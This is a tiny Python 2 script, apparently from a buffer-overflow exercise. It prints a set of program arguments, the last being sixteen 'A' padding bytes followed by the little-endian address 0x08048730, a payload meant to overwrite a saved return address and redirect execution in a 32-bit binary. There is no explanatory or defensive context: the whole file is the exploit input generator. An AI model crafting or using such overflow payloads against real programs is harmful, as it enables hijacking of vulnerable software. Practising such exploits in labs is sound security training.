#!/usr/bin/python
from subprocess import call
argv = ['1', '2', '3', '4', '5', '6', 'A'*16 + '\x30\x87\x04\x08']
for i in argv:
    print i + " ";
